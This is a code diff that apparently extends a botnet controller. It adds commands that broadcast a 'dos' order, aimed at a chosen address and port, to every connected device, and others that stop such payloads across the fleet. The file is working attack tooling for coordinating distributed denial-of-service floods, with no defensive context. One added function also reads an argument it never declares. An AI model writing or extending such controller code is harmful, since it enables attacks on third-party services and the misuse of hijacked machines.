@@ -64,6 +64,16 @@ def cpay(x):
 def cpaydis(x):
     return ds.distribute_packet(Packet("execute", " ".join([y for y in x if y != None])))
 
+@cc.command(["ddos"],
+    Arg(str, "address."),
+    Arg(int, "port"))
+def cddos(x):
+    return ds.distribute_packet(Packet("execute", "dos %s %s"%(x[0],x[1])))
+
+@cc.command(["killddos"])
+def ckillddos(x):
+    return ds.distribute_packet(Packet("paykill", "dos"))
+
 @cc.command(["active"],
 Arg(str, "target device"))
 def cactive(x):
@@ -76,6 +86,11 @@ Arg(str, "Payload."))
 def cpaykill(x):
     if ds.get(x[0], None) == None: return "Can not find device '%s'"%x[0]
     return ds[x[0]].send(Packet("paykill", x[1]))
+
+@cc.command(["paykilldis"],
+Arg(str, "Payload."))
+def cpaykilldis(x):
+    return ds.distribute_packet(Packet("paykill", x[1]))
 
 @cc.command(["file"],
     Arg(str, "target device"),
